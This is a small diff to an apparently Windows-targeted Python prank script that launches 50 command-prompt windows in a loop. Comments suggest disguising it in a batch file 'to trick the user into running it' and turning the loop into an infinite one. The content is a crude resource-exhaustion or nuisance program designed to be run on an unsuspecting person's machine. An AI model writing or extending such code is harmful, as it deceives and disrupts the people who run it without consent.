@@ -5,5 +5,6 @@ import sys
 #Create a batch file and launch this program along with the target to trick the user into running it >:)
 #os.system("start firefox")
 
+#Make this into an infinte loop if desired
 for x in range(50):
     os.system("start cmd")
